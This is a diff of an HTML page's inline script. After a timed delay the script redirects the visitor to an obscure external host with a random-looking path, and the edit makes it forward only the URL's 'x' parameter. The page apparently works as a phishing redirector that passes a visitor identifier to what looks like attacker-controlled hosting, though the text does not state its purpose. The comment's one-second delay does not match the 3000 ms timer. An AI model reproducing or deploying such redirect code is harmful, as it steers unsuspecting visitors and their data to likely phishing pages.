@@ -46,28 +46,22 @@
   </style>
 
   <script>
-    function getQueryParams() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams;
-    }
-
     // JavaScript to simulate the 1-second delay before redirection
     setTimeout(function() {
-        const urlParams = getQueryParams(); // Get all query parameters from the current URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const xValue = urlParams.get('x'); // Get the value of the 'x' parameter, if any
         const baseRedirectUrl = "https://styczynskamonikawppl.smarthost.pl/kyutiurtu85erwsjikh37y8rhw23e9puds/"; // Base redirect URL
 
-        // Create a new URLSearchParams object to append the current query parameters
-        const newParams = new URLSearchParams(urlParams);
-
-        // Build the full redirect URL with the query parameters appended
-        const redirectUrl = newParams.toString()
-            ? `${baseRedirectUrl}/?${newParams.toString()}`
+        // If 'x' parameter exists, append it to the redirect URL
+        const redirectUrl = xValue 
+            ? `${baseRedirectUrl}?x=${encodeURIComponent(xValue)}`
             : baseRedirectUrl;
 
         // Redirect to the URL
         window.location.href = redirectUrl;
     }, 3000);
 </script>
+
 
 
 
